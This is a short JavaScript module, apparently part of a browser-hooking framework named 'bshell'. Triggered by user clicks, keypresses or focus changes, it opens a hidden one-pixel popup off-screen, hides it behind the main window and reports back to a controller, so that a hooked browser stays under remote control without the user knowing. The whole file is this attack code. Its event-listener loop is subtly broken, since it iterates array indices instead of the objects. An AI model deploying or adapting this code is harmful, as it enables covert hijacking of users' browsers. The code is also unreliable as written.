function(bsh) {
    this.hooked = false;
    var self = this;
    
    this.addEvt = function(obj, on, handler) {
	if(obj.addEventListener)
	    obj.addEventListener(on, handler);
	else if(obj.attachEvent)
	    obj.attachEvent('on'+on,handler);
    };

    var hook = function() {
	if(self.hooked)
	    return;
	var w = window.open("/bshell/bshell.html", "bshell", "width=1,height=1,left=9999,top=9999,scrollbars=no,location=no,directories=no,status=no,menubar=no,toolbar=no,resizable=no");
	if(w) {
	    w.blur();
	    window.focus();
	    self.hooked = true;
	    bsh.send({success: true});
	    bsh.stop();
	}
	else {
	    bsh.send({error: "popup blocked"});
	}
    };
    
    if(window.name != "bshellpop") {
	var objs = [window, document.body];
	for(var o in objs) {
	    this.addEvt(o, 'click',   hook);
	    this.addEvt(o, 'keydown', hook);
	    this.addEvt(o, 'focus',   hook);
	    this.addEvt(o, 'blur',    hook);
	}
    }
}(bshell);
